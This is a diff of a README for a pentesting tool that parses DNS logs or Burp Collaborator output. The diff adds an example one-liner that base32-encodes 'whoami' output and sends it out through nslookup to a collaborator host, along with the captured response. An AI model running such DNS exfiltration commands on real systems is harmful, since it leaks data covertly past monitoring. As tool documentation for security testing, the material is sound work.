@@ -2,13 +2,22 @@
 
 Parses bind query logs or private Burp Collaborator output to exfiltrate data. 
 
-Burp Collaborator allows appending hostnames to the provided address. For example: assume this is your collaborator address: `h6olm71com6vuvx1bsaqddjik9q4et.oastify.com`
+Burp Collaborator allows appending hostnames to the provided address. For example: assume this is your collaborator address: `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`
 
 You may prepend a 'hostname' (maximum length of a DNS label is 63 bytes), assuming it uses characters safe in a DNS query (such as base32-encoded data, see below). This allows exfiltration (including blind exfiltration) of data via DNS.
 
 Here is the base32-encoded output from `whoami` exfiltrated via Burp Collaborator:
 
-`O53XOLLEMF2GCCQ.h6olm71com6vuvx1bsaqddjik9q4et.oastify.com`
+Command:
+
+`a=$(whoami|base32|tr -d =);nslookup $a.q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`
+
+Burp Collaborator response:
+
+`O53XOLLEMF2GCCQ.q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`
+
+![Screen Shot 2023-01-10 at 2 59 05 PM](https://user-images.githubusercontent.com/14989334/211650128-5d6a8562-3d64-4ec8-b530-bc47ae5a0db0.png)
+
 
 `dns-parse.py` parses native bind query logs, or private Burp Collaborator output, which may be logged via `tee`:
 
